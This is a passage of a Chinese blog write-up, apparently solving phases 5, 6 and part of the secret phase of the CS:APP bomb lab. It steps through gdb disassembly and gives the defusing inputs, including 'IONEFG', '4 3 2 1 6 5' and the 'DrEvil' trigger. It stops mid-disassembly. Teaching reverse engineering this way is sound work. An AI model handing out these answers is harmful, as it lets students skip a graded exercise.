<h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">反汇编phase_5()函数</span><br><span class="line">   0x0000000000401063 &lt;+1&gt;:		sub    $0x20,%rsp</span><br><span class="line">   0x0000000000401067 &lt;+5&gt;:		mov    %rdi,%rbx</span><br><span class="line">   0x000000000040106a &lt;+8&gt;:		mov    %fs:0x28,%rax</span><br><span class="line">   0x0000000000401073 &lt;+17&gt;:	mov    %rax,0x18(%rsp)</span><br><span class="line">   0x0000000000401078 &lt;+22&gt;:	xor    %eax,%eax</span><br><span class="line">   0x000000000040107a &lt;+24&gt;:	callq  0x40131b &lt;string_length&gt;</span><br><span class="line">   0x000000000040107f &lt;+29&gt;:	cmp    $0x6,%eax</span><br><span class="line">   0x0000000000401082 &lt;+32&gt;:	je     0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line">   0x0000000000401084 &lt;+34&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line"></span><br><span class="line">首先可见该函数在栈上申请了32字节空间，接着将fs:0x28地址处的某值放入0x18(%rsp)中，即设置金丝雀值用于栈破坏检测然后调用string_length()函数检查输入字符串字符数目是否为6，非6则炸弹爆炸，由此知应输入字符数目为6.接下来结合</span><br><span class="line">   0x0000000000401082 &lt;+32&gt;:	je     0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line">   </span><br><span class="line">   0x00000000004010d2 &lt;+112&gt;:	mov    $0x0,%eax</span><br><span class="line">   0x00000000004010d7 &lt;+117&gt;:	jmp    0x40108b &lt;phase_5+41&gt;</span><br><span class="line">   </span><br><span class="line">在确认输入字符串字符数为6后，先将%rax值清零，然后进入一段循环</span><br><span class="line">   0x000000000040108b &lt;+41&gt;:	movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">   0x000000000040108f &lt;+45&gt;:	mov    %cl,(%rsp)</span><br><span class="line">   0x0000000000401092 &lt;+48&gt;:	mov    (%rsp),%rdx</span><br><span class="line">   0x0000000000401096 &lt;+52&gt;:	and    $0xf,%edx</span><br><span class="line">   0x0000000000401099 &lt;+55&gt;:	movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">   0x00000000004010a0 &lt;+62&gt;:	mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">   0x00000000004010a4 &lt;+66&gt;:	add    $0x1,%rax</span><br><span class="line">   0x00000000004010a8 &lt;+70&gt;:	cmp    $0x6,%rax</span><br><span class="line">   0x00000000004010ac &lt;+74&gt;:	jne    0x40108b &lt;phase_5+41&gt;</span><br><span class="line"></span><br><span class="line">分析知该循环代码依次将我们所输入的六个字符的低四位作为索引，取0x4024b0作为基地址，分六次将索引对应的字符取出存入%rsp + 16 + bias处的栈中，于是我们先反汇编看下0x4024b0地址处存储的信息</span><br><span class="line">(gdb) x &#x2F;s 0x4024b0</span><br><span class="line">0x4024b0 &lt;array.3449&gt;:	&quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span><br><span class="line"></span><br><span class="line">由于索引为我们输入字符的低四位，即索引范围为0 ~ 15，对应该字符串的</span><br><span class="line">	maduiersnfotvbyl</span><br><span class="line"></span><br><span class="line">部分，继续查看phase_5()函数代码</span><br><span class="line">   0x00000000004010ae &lt;+76&gt;:	movb   $0x0,0x16(%rsp)</span><br><span class="line">   0x00000000004010b3 &lt;+81&gt;:	mov    $0x40245e,%esi</span><br><span class="line">   0x00000000004010b8 &lt;+86&gt;:	lea    0x10(%rsp),%rdi</span><br><span class="line">   0x00000000004010bd &lt;+91&gt;:	callq  0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">   0x00000000004010c2 &lt;+96&gt;:	test   %eax,%eax</span><br><span class="line">   0x00000000004010c4 &lt;+98&gt;:	je     0x4010d9 &lt;phase_5+119&gt;</span><br><span class="line">   0x00000000004010c6 &lt;+100&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line"></span><br><span class="line">string_not_equal在之前的谜题里已见过，易知此段代码作用为将刚才通过索引选出的6个字符与首地址为0x40245e处的字符串进行比较，若不匹配则炸弹爆炸，故查看地址0x40245e处字符串内容</span><br><span class="line">(gdb) x &#x2F;s 0x40245e</span><br><span class="line">0x40245e:	&quot;flyers&quot;</span><br><span class="line"></span><br><span class="line">这六个字符分别对应谜题字符串中的[9, 15, 14, 5, 6, 7]位(从0起计数)，而高四位不做限制，故本题答案不唯一，查阅ascii表易得其中两个答案为&quot;9?&gt;567&quot;, &quot;IONEFG&quot;，其余答案不一一枚举。phase_5()函数最后几行代码用于检测是否发生栈溢出，在此不做更多介绍</span><br></pre></td></tr></table></figure>

<h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">反汇编phase_6()函数</span><br><span class="line">   0x00000000004010fc &lt;+8&gt;:		sub    $0x50,%rsp</span><br><span class="line">   0x0000000000401100 &lt;+12&gt;:	mov    %rsp,%r13</span><br><span class="line">   0x0000000000401103 &lt;+15&gt;:	mov    %rsp,%rsi</span><br><span class="line">   0x0000000000401106 &lt;+18&gt;:	callq  0x40145c &lt;read_six_numbers&gt;</span><br><span class="line">   0x000000000040110b &lt;+23&gt;:	mov    %rsp,%r14</span><br><span class="line"></span><br><span class="line">在栈上开辟80字节空间后，将%r13, %rsi, %r14寄存器的值都设为当前栈顶地址。且知本题需输入六个数字</span><br><span class="line">   0x000000000040110e &lt;+26&gt;:	mov    $0x0,%r12d</span><br><span class="line">   0x0000000000401114 &lt;+32&gt;:	mov    %r13,%rbp</span><br><span class="line">   0x0000000000401117 &lt;+35&gt;:	mov    0x0(%r13),%eax</span><br><span class="line">   0x000000000040111b &lt;+39&gt;:	sub    $0x1,%eax</span><br><span class="line">   0x000000000040111e &lt;+42&gt;:	cmp    $0x5,%eax</span><br><span class="line">   0x0000000000401121 &lt;+45&gt;:	jbe    0x401128 &lt;phase_6+52&gt;</span><br><span class="line">   0x0000000000401123 &lt;+47&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401128 &lt;+52&gt;:	add    $0x1,%r12d</span><br><span class="line">   0x000000000040112c &lt;+56&gt;:	cmp    $0x6,%r12d</span><br><span class="line">   0x0000000000401130 &lt;+60&gt;:	je     0x401153 &lt;phase_6+95&gt;</span><br><span class="line">   0x0000000000401132 &lt;+62&gt;:	mov    %r12d,%ebx</span><br><span class="line">   0x0000000000401135 &lt;+65&gt;:	movslq %ebx,%rax</span><br><span class="line">   0x0000000000401138 &lt;+68&gt;:	mov    (%rsp,%rax,4),%eax</span><br><span class="line">   0x000000000040113b &lt;+71&gt;:	cmp    %eax,0x0(%rbp)</span><br><span class="line">   0x000000000040113e &lt;+74&gt;:	jne    0x401145 &lt;phase_6+81&gt;</span><br><span class="line">   0x0000000000401140 &lt;+76&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401145 &lt;+81&gt;:	add    $0x1,%ebx</span><br><span class="line">   0x0000000000401148 &lt;+84&gt;:	cmp    $0x5,%ebx</span><br><span class="line">   0x000000000040114b &lt;+87&gt;:	jle    0x401135 &lt;phase_6+65&gt;</span><br><span class="line">   0x000000000040114d &lt;+89&gt;:	add    $0x4,%r13</span><br><span class="line">   0x0000000000401151 &lt;+93&gt;:	jmp    0x401114 &lt;phase_6+32&gt;</span><br><span class="line"></span><br><span class="line">分析知本谜题六个输入数字均小于等于6，且六个数字各不相同</span><br><span class="line">   0x0000000000401153 &lt;+95&gt;:	lea    0x18(%rsp),%rsi</span><br><span class="line">   0x0000000000401158 &lt;+100&gt;:	mov    %r14,%rax</span><br><span class="line">   0x000000000040115b &lt;+103&gt;:	mov    $0x7,%ecx</span><br><span class="line">   0x0000000000401160 &lt;+108&gt;:	mov    %ecx,%edx</span><br><span class="line">   0x0000000000401162 &lt;+110&gt;:	sub    (%rax),%edx</span><br><span class="line">   0x0000000000401164 &lt;+112&gt;:	mov    %edx,(%rax)</span><br><span class="line">   0x0000000000401166 &lt;+114&gt;:	add    $0x4,%rax</span><br><span class="line">   0x000000000040116a &lt;+118&gt;:	cmp    %rsi,%rax</span><br><span class="line">   0x000000000040116d &lt;+121&gt;:	jne    0x401160 &lt;phase_6+108&gt;</span><br><span class="line"></span><br><span class="line">设六个输入按顺序为a[0]至a[5]，上述循环令a[i] &#x3D; 7 - a[i]</span><br><span class="line">   0x000000000040116f &lt;+123&gt;:	mov    $0x0,%esi</span><br><span class="line">   0x0000000000401174 &lt;+128&gt;:	jmp    0x401197 &lt;phase_6+163&gt;</span><br><span class="line">   0x0000000000401176 &lt;+130&gt;:	mov    0x8(%rdx),%rdx</span><br><span class="line">   0x000000000040117a &lt;+134&gt;:	add    $0x1,%eax</span><br><span class="line">   0x000000000040117d &lt;+137&gt;:	cmp    %ecx,%eax</span><br><span class="line">   0x000000000040117f &lt;+139&gt;:	jne    0x401176 &lt;phase_6+130&gt;</span><br><span class="line">   0x0000000000401181 &lt;+141&gt;:	jmp    0x401188 &lt;phase_6+148&gt;</span><br><span class="line">   0x0000000000401183 &lt;+143&gt;:	mov    $0x6032d0,%edx</span><br><span class="line">   0x0000000000401188 &lt;+148&gt;:	mov    %rdx,0x20(%rsp,%rsi,2)</span><br><span class="line">   0x000000000040118d &lt;+153&gt;:	add    $0x4,%rsi</span><br><span class="line">   0x0000000000401191 &lt;+157&gt;:	cmp    $0x18,%rsi</span><br><span class="line">   0x0000000000401195 &lt;+161&gt;:	je     0x4011ab &lt;phase_6+183&gt;</span><br><span class="line">   0x0000000000401197 &lt;+163&gt;:	mov    (%rsp,%rsi,1),%ecx</span><br><span class="line">   0x000000000040119a &lt;+166&gt;:	cmp    $0x1,%ecx</span><br><span class="line">   0x000000000040119d &lt;+169&gt;:	jle    0x401183 &lt;phase_6+143&gt;</span><br><span class="line">   0x000000000040119f &lt;+171&gt;:	mov    $0x1,%eax</span><br><span class="line">   0x00000000004011a4 &lt;+176&gt;:	mov    $0x6032d0,%edx</span><br><span class="line">   0x00000000004011a9 &lt;+181&gt;:	jmp    0x401176 &lt;phase_6+130&gt;</span><br><span class="line"></span><br><span class="line">分析知有一链表首地址为0x6032d0，该链表一个结点16字节，后8字节用于存放指向下一个结点的指针，于是顺藤摸瓜找出该链表所有结点，设结点按顺序分别为b[0]至b[5]，上述代码作用为将a[i] - 1对应的结点地址放于%rsp + 32为基地址的栈中(e.g. 假设a[0] &#x3D; 3，则将b[2]放于(%rsp + 32 + 0 * 8)处空间中)</span><br><span class="line">(gdb) x &#x2F;16xb 0x6032d0</span><br><span class="line">0x6032d0 &lt;node1&gt;:	0x4c	0x01	0x00	0x00	0x01	0x00	0x00	0x00</span><br><span class="line">0x6032d8 &lt;node1+8&gt;:	0xe0	0x32	0x60	0x00	0x00	0x00	0x00	0x00</span><br><span class="line">(gdb) x &#x2F;16xb 0x6032e0</span><br><span class="line">0x6032e0 &lt;node2&gt;:	0xa8	0x00	0x00	0x00	0x02	0x00	0x00	0x00</span><br><span class="line">0x6032e8 &lt;node2+8&gt;:	0xf0	0x32	0x60	0x00	0x00	0x00	0x00	0x00</span><br><span class="line">(gdb) x &#x2F;16xb 0x6032f0</span><br><span class="line">0x6032f0 &lt;node3&gt;:	0x9c	0x03	0x00	0x00	0x03	0x00	0x00	0x00</span><br><span class="line">0x6032f8 &lt;node3+8&gt;:	0x00	0x33	0x60	0x00	0x00	0x00	0x00	0x00</span><br><span class="line">(gdb) x &#x2F;16xb 0x603300</span><br><span class="line">0x603300 &lt;node4&gt;:	0xb3	0x02	0x00	0x00	0x04	0x00	0x00	0x00</span><br><span class="line">0x603308 &lt;node4+8&gt;:	0x10	0x33	0x60	0x00	0x00	0x00	0x00	0x00</span><br><span class="line">(gdb) x &#x2F;16xb 0x603310</span><br><span class="line">0x603310 &lt;node5&gt;:	0xdd	0x01	0x00	0x00	0x05	0x00	0x00	0x00</span><br><span class="line">0x603318 &lt;node5+8&gt;:	0x20	0x33	0x60	0x00	0x00	0x00	0x00	0x00</span><br><span class="line">(gdb) x &#x2F;16xb 0x603320</span><br><span class="line">0x603320 &lt;node6&gt;:	0xbb	0x01	0x00	0x00	0x06	0x00	0x00	0x00</span><br><span class="line">0x603328 &lt;node6+8&gt;:	0x00	0x00	0x00	0x00	0x00	0x00	0x00</span><br><span class="line"></span><br><span class="line">继续阅读</span><br><span class="line">   0x00000000004011ab &lt;+183&gt;:	mov    0x20(%rsp),%rbx</span><br><span class="line">   0x00000000004011b0 &lt;+188&gt;:	lea    0x28(%rsp),%rax</span><br><span class="line">   0x00000000004011b5 &lt;+193&gt;:	lea    0x50(%rsp),%rsi</span><br><span class="line">   0x00000000004011ba &lt;+198&gt;:	mov    %rbx,%rcx</span><br><span class="line">   0x00000000004011bd &lt;+201&gt;:	mov    (%rax),%rdx</span><br><span class="line">   0x00000000004011c0 &lt;+204&gt;:	mov    %rdx,0x8(%rcx)</span><br><span class="line">   0x00000000004011c4 &lt;+208&gt;:	add    $0x8,%rax</span><br><span class="line">   0x00000000004011c8 &lt;+212&gt;:	cmp    %rsi,%rax</span><br><span class="line">   0x00000000004011cb &lt;+215&gt;:	je     0x4011d2 &lt;phase_6+222&gt;</span><br><span class="line">   0x00000000004011cd &lt;+217&gt;:	mov    %rdx,%rcx</span><br><span class="line">   0x00000000004011d0 &lt;+220&gt;:	jmp    0x4011bd &lt;phase_6+201&gt;</span><br><span class="line"></span><br><span class="line">上述代码将结点按新的顺序链成链表</span><br><span class="line">   0x00000000004011d2 &lt;+222&gt;:	movq   $0x0,0x8(%rdx)</span><br><span class="line">   0x00000000004011da &lt;+230&gt;:	mov    $0x5,%ebp</span><br><span class="line">   0x00000000004011df &lt;+235&gt;:	mov    0x8(%rbx),%rax</span><br><span class="line">   0x00000000004011e3 &lt;+239&gt;:	mov    (%rax),%eax</span><br><span class="line">   0x00000000004011e5 &lt;+241&gt;:	cmp    %eax,(%rbx)</span><br><span class="line">   0x00000000004011e7 &lt;+243&gt;:	jge    0x4011ee &lt;phase_6+250&gt;</span><br><span class="line">   0x00000000004011e9 &lt;+245&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004011ee &lt;+250&gt;:	mov    0x8(%rbx),%rbx</span><br><span class="line">   0x00000000004011f2 &lt;+254&gt;:	sub    $0x1,%ebp</span><br><span class="line">   0x00000000004011f5 &lt;+257&gt;:	jne    0x4011df &lt;phase_6+235&gt;</span><br><span class="line"></span><br><span class="line">分析知正确的结点值应从高到低排列，又因比较结点值时使用的是%eax寄存器，故比较的是各结点前四字节的值，即根据我们输入的六个不同数值a[0]至a[5]，分别取a[i] &#x3D; 7 - a[i]，再用新的a[i]值将原链表结点顺序重排得新链表，保证新链表的结点值为从高至低排列。原各结点值如下表</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">node1</th>
<th align="center">node2</th>
<th align="center">node3</th>
<th align="center">node4</th>
<th align="center">node5</th>
<th align="center">node6</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0x14c</td>
<td align="center">0xa8</td>
<td align="center">0x39c</td>
<td align="center">0x2b3</td>
<td align="center">0x1dd</td>
<td align="center">0x1bb</td>
</tr>
</tbody></table>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">按从大到小排列为 [node3, node4, node5, node6, node1, node2]</span><br><span class="line">	a[<span class="number">0</span>]新 - <span class="number">1</span> = <span class="number">3</span></span><br><span class="line">	a[<span class="number">1</span>]新 - <span class="number">1</span> = <span class="number">4</span></span><br><span class="line">	...</span><br><span class="line">	a[<span class="number">5</span>]新 - <span class="number">1</span> = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">而</span><br><span class="line">	a[i]新 = <span class="number">7</span> - a[i]旧</span><br><span class="line"></span><br><span class="line">故</span><br><span class="line">	a旧 = [<span class="number">4</span>, <span class="number">3</span> ,<span class="number">2</span> ,<span class="number">1</span> ,<span class="number">6</span>, <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">即应输入六数分别为[<span class="number">4</span>, <span class="number">3</span> ,<span class="number">2</span> ,<span class="number">1</span> ,<span class="number">6</span>, <span class="number">5</span>]</span><br></pre></td></tr></table></figure>

<h2 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret_phase"></a>secret_phase</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line">反汇编phase_defused()函数</span><br><span class="line">   0x00000000004015c4 &lt;+0&gt;:		sub    $0x78,%rsp</span><br><span class="line">   0x00000000004015c8 &lt;+4&gt;:		mov    %fs:0x28,%rax</span><br><span class="line">   0x00000000004015d1 &lt;+13&gt;:	mov    %rax,0x68(%rsp)</span><br><span class="line">   0x00000000004015d6 &lt;+18&gt;:	xor    %eax,%eax</span><br><span class="line">   0x00000000004015d8 &lt;+20&gt;:	cmpl   $0x6,0x202181(%rip)        # 0x603760 &lt;num_input_strings&gt;</span><br><span class="line">   0x00000000004015df &lt;+27&gt;:	jne    0x40163f &lt;phase_defused+123&gt;</span><br><span class="line"></span><br><span class="line">发现只有六个谜题都破解后才会触发隐藏谜题，继续向下分析</span><br><span class="line">   0x00000000004015e1 &lt;+29&gt;:	lea    0x10(%rsp),%r8</span><br><span class="line">   0x00000000004015e6 &lt;+34&gt;:	lea    0xc(%rsp),%rcx</span><br><span class="line">   0x00000000004015eb &lt;+39&gt;:	lea    0x8(%rsp),%rdx</span><br><span class="line">   0x00000000004015f0 &lt;+44&gt;:	mov    $0x402619,%esi</span><br><span class="line">   0x00000000004015f5 &lt;+49&gt;:	mov    $0x603870,%edi</span><br><span class="line">   0x00000000004015fa &lt;+54&gt;:	callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x00000000004015ff &lt;+59&gt;:	cmp    $0x3,%eax</span><br><span class="line">   0x0000000000401602 &lt;+62&gt;:	jne    0x401635 &lt;phase_defused+113&gt;</span><br><span class="line"></span><br><span class="line">发现函数调用首地址为0x400bf0的sscanf()函数读入数据，查看%0x402619处内容，得</span><br><span class="line">(gdb) x &#x2F;s 0x402619</span><br><span class="line">0x402619:	&quot;%d %d %s&quot;</span><br><span class="line"></span><br><span class="line">故知一次读入两个int型数据和一个字符串，分别存入0x8(%rsp), 0xc(%rsp), 0x10(%rsp)中</span><br><span class="line">   0x0000000000401604 &lt;+64&gt;:	mov    $0x402622,%esi</span><br><span class="line">   0x0000000000401609 &lt;+69&gt;:	lea    0x10(%rsp),%rdi</span><br><span class="line">   0x000000000040160e &lt;+74&gt;:	callq  0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">   0x0000000000401613 &lt;+79&gt;:	test   %eax,%eax</span><br><span class="line">   0x0000000000401615 &lt;+81&gt;:	jne    0x401635 &lt;phase_defused+113&gt;</span><br><span class="line"></span><br><span class="line">接着phase_defused()调用strings_not_euqal()检测我们输入的字符串与首地址为0x402622处的模式串是否匹配，于是查看该地址处的字符串得正解</span><br><span class="line">(gdb) x &#x2F;s 0x402622</span><br><span class="line">0x402622:	&quot;DrEvil&quot;</span><br><span class="line"></span><br><span class="line">需注意，phase_defused()函数并未调用诸如read_line()等函数读取输入，而是直接默认从0x603870地址处读取数据。而前六个谜题每个都调用了一次read_line()函数，再通过</span><br><span class="line">	mov %rax, %rdi</span><br><span class="line"></span><br><span class="line">指令将输入的数据传给相应函数，于是猜测0x603870为main()函数中某次调用read_line()参数获得用户输入后传给phase_x()函数的地址，检查六次调用read_line()后read_line()传送给phase_x()函数的地址，得六个地址分别为</span><br><span class="line">	0x603780</span><br><span class="line">	0x6037d0</span><br><span class="line">	0x603820</span><br><span class="line">	0x603870</span><br><span class="line">	0x6038c0</span><br><span class="line">	0x603910</span><br><span class="line"></span><br><span class="line">知0x603870为第四次read_line()后传递给phase_4()的输入数据的首地址，而第四个谜题需输入两个int型变量，因此只需在第四题的答案后面加上字符串&quot;DrEvil&quot;即可在六个谜题结束后触发隐藏谜题，继续分析</span><br><span class="line">   0x0000000000401617 &lt;+83&gt;:	mov    $0x4024f8,%edi</span><br><span class="line">   0x000000000040161c &lt;+88&gt;:	callq  0x400b10 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000401621 &lt;+93&gt;:	mov    $0x402520,%edi</span><br><span class="line">   0x0000000000401626 &lt;+98&gt;:	callq  0x400b10 &lt;puts@plt&gt;</span><br><span class="line">   0x000000000040162b &lt;+103&gt;:	mov    $0x0,%eax</span><br><span class="line">   0x0000000000401630 &lt;+108&gt;:	callq  0x401242 &lt;secret_phase&gt;</span><br><span class="line">   0x0000000000401635 &lt;+113&gt;:	mov    $0x402558,%edi</span><br><span class="line">   0x000000000040163a &lt;+118&gt;:	callq  0x400b10 &lt;puts@plt&gt;</span><br><span class="line">   0x000000000040163f &lt;+123&gt;:	mov    0x68(%rsp),%rax</span><br><span class="line">   0x0000000000401644 &lt;+128&gt;:	xor    %fs:0x28,%rax</span><br><span class="line">   0x000000000040164d &lt;+137&gt;:	je     0x401654 &lt;phase_defused+144&gt;</span><br><span class="line">   0x000000000040164f &lt;+139&gt;:	callq  0x400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x0000000000401654 &lt;+144&gt;:	add    $0x78,%rsp</span><br><span class="line">   0x0000000000401658 &lt;+148&gt;:	retq   </span><br><span class="line"></span><br><span class="line">函数输出两字符串，调用secret_phase()函数，再输出一字符串，检查栈是否溢出，结束。于是接下来分析secret_phase()函数</span><br><span class="line">   0x0000000000401242 &lt;+0&gt;:		push   %rbx</span><br><span class="line">   0x0000000000401243 &lt;+1&gt;:		callq  0x40149e &lt;read_line&gt;</span><br><span class="line">   0x0000000000401248 &lt;+6&gt;:		mov    $0xa,%edx</span><br><span class="line">   0x000000000040124d &lt;+11&gt;:	mov    $0x0,%esi</span><br><span class="line">   0x0000000000401252 &lt;+16&gt;:	mov    %rax,%rdi</span><br><span class="line">   0x0000000000401255 &lt;+19&gt;:	callq  0x400bd0 &lt;strtol@plt&gt;</span><br><span class="line">   0x000000000040125a &lt;+24&gt;:	mov    %rax,%rbx</span><br><span class="line">   0x000000000040125d &lt;+27&gt;:	lea    -0x1(%rax),%eax</span><br><span class="line">   0x0000000000401260 &lt;+30&gt;:	cmp    $0x3e8,%eax</span><br><span class="line">   0x0000000000401265 &lt;+35&gt;:	jbe    0x40126c &lt;secret_phase+42&gt;</span><br><span class="line">   0x0000000000401267 &lt;+37&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line"></span><br><span class="line">通过调用read_line()函数读入字符串，并调用strtol()函数将其转换为十进制数字，且该数字应小于等于0x3e9，否则炸弹爆炸</span><br><span class="line">   0x000000000040126c &lt;+42&gt;:	mov    %ebx,%esi</span><br><span class="line">   0x000000000040126e &lt;+44&gt;:	mov    $0x6030f0,%edi</span><br><span class="line">   0x0000000000401273 &lt;+49&gt;:	callq  0x401204 